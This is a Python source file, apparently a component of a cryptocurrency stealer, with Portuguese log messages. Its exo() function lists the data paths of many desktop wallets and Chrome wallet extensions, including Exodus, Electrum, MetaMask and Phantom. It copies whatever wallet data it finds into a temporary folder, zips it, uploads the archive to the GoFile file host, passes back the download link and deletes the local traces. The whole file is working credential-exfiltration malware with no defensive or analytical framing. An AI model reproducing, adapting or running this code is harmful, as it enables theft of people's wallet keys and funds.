import os
import zipfile
import requests
import logging
import threading

user = os.path.expanduser("~")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            try:
                with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                    f_write.write(f_read.read())
                print(f"Copied {src_path} to {dst_path}")
            except IOError as e:
                print(f"Failed to copy {src_path} to {dst_path}: {e}")

def get_gofile_server(zone=None):
    params = {}
    if zone:
        params['zone'] = zone
    response = requests.get("https://api.gofile.io/servers", params=params)
    if response.status_code == 200:
        data = response.json()
        if data.get("status") == "ok" and "servers" in data["data"]:
            servers = data["data"]["servers"]
            if servers:
                return servers[0]["name"]
        logging.error(f"Erro na resposta do servidor GoFile: {data}")
    else:
        logging.error(f"Falha ao obter servidor GoFile. Status: {response.status_code}")
    return None

def upload_to_gofile(file_path, callback, zone=None, folder_id=None):
    server = get_gofile_server(zone)
    if not server:
        logging.error("Não foi possível obter o servidor GoFile")
        callback(False)
        return

    url = f"https://{server}.gofile.io/uploadFile"
    logging.info(f"Iniciando upload para GoFile: {file_path}")
    logging.info(f"URL de upload: {url}")

    try:
        with open(file_path, "rb") as file:
            files = {"file": file}
            data = {}
            if folder_id:
                data['folderId'] = folder_id
            response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            try:
                data = response.json()
                logging.info(f"Resposta do servidor: {data}")
                if data.get("status") == "ok":
                    download_link = data["data"]["downloadPage"]
                    logging.info(f"Upload bem-sucedido! Link: {download_link}")
                    callback(download_link)
                    os.remove(file_path)  # Exclui o arquivo zip após o upload
                else:
                    logging.error(f"Erro no upload: {data}")
                    callback(False)
            except ValueError as e:
                logging.error(f"Erro ao processar resposta JSON: {e}")
                logging.error(f"Resposta do servidor: {response.text}")
                callback(False)
        else:
            logging.error(f"Falha no upload. Status: {response.status_code}")
            logging.error(f"Resposta do servidor: {response.text}")
            callback(False)
    except Exception as e:
        logging.error(f"Erro durante o upload: {e}")
        callback(False)

def exo(callback):
    wallets = {
        "Exodus": os.path.join(user, "AppData\\Roaming\\Exodus"),
        "Electrum": os.path.join(user, "AppData\\Roaming\\Electrum"),
        "Atomic": os.path.join(user, "AppData\\Roaming\\atomic"),
        "HarmonyOutdated": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"),
        "Authenticator": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"),
        "TempleTezos": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        "TerraStation": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"),
        "Tokenpocket": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"),
        "Trust Wallet": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"),
        "Jaxx Liberty": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"),
        "KardiaChain": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        "ExodusWeb3": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"),
        "PaliWallet": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"),
        "Metamask2": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"),
        "MaiarDEFI": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"),
        "Liquality": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"),
        "Coinbase": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"),
        "Crocobit": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"),
        "Starcoin": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"),
        "iWallet": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"),
        "Binance": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"),
        "Metamask": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "Martian": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"),
        "Bitapp": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
        "BoltX": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"),
        "Yoroi": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"),
        "Swash": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"),
        "Tron": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        "Coin98": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"),
        "Core": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"),
        "Equal": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"),
        "Ever": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"),
        "Fewcha": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"),
        "Finnie": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"),
        "Guarda": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        "Guild": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"),
        "Iconex": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"),
        "Kaikas": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"),
        "Keplr": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"),
        "MEWCX": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        "Math": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        "Mobox": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"),
        "Nami": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"),
        "Nifty": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"),
        "Oxygen": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"),
        "Petra": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"),
        "XDEFI": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        "XMR.PT": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"),
        "XinPay": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"),
        "Ton": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"),
        "Phantom": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        "Pontem": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"),
        "Ronin": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"),
        "Safepal": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"),
        "Saturn": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"),
        "Slope": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"),
        "Solfare": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"),
        "Sollet": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"),
        "Wombat": os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"),
        'AtomicWallet': os.path.join(user, 'AppData\\Roaming\\atomic\\Local Storage\\leveldb'),
        'Ethereum': os.path.join(user, 'AppData\\Roaming\\Ethereum\\'),
        'Electrum': os.path.join(user, 'AppData\\Roaming\\Electrum\\'),
        'Bytecoin': os.path.join(user, 'AppData\\Roaming\\bytecoin'),
        'Coinomi': os.path.join(user, 'AppData\\Roaming\\Coinomi\\Coinomi\\wallets'),
        'Guarda': os.path.join(user, 'AppData\\Roaming\\Guarda\\'),
        'Exodus': os.path.join(user, 'AppData\\Roaming\\Exodus'),
        'Armory': os.path.join(user, 'AppData\\Roaming\\Armory'),
        'Zcash': os.path.join(user, 'AppData\\Roaming\\Zcash'),
        'Jaxx': os.path.join(user, 'AppData\\Roaming\\com.liberty.jaxx\\'),
    }
    temp_wallets_path = os.path.join(user, "AppData\\Local\\Temp\\Wallets")
    temp_wallets_zip_path = os.path.join(user, "AppData\\Local\\Temp", "Wallets.zip")

    for wallet_name, wallet_path in wallets.items():
        if os.path.exists(wallet_path):
            wallet_temp_path = os.path.join(temp_wallets_path, wallet_name)
            print(f"Copying {wallet_name} directory...")
            copy_directory(wallet_path, wallet_temp_path)
        else:
            print(f"{wallet_name} directory does not exist.")

    # Compress the wallets directory
    print("Compressing wallets directory...")
    with zipfile.ZipFile(temp_wallets_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(temp_wallets_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), temp_wallets_path))
    print(f"Directory compressed to {temp_wallets_zip_path}")

    # Upload the zip file to GoFile
    def upload_callback(result):
        if result:
            print(f"Upload successful! Download link: {result}")
        else:
            print("Upload failed.")
        callback(result)

    threading.Thread(target=upload_to_gofile, args=(temp_wallets_zip_path, upload_callback)).start()

    # Cleanup
    try:
        for root, dirs, files in os.walk(temp_wallets_path, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(temp_wallets_path)
        print("Cleanup successful.")
    except Exception as e:
        print(f"Cleanup failed: {e}")

    return temp_wallets_zip_path

